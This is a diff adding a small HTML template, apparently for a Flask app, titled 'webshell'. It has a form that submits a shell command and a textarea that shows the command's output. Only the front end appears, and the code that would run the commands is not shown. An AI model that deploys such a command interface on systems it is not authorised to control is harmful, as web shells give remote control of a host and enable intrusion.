@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf8">
+        <title>webshell</title>
+        <link rel= "stylesheet" type= "text/css" href= "{{ url_for('static', filename='style.css') }}">
+        <script src="{{url_for('static', filename='script.js')}}"></script>
+    </head>
+
+    <body>
+        <div>command<br></div>
+        <form method="post">
+            <textarea rows="2" cols="90" name="command">{{request.form['command']}}</textarea><br>
+            <input type="submit" value="submit">
+        </form>
+
+        <div>output<br></div>
+        <textarea rows="30" cols="90" name="description" readonly="readonly">{{ message }}</textarea><br>
+    </body>
+</html>
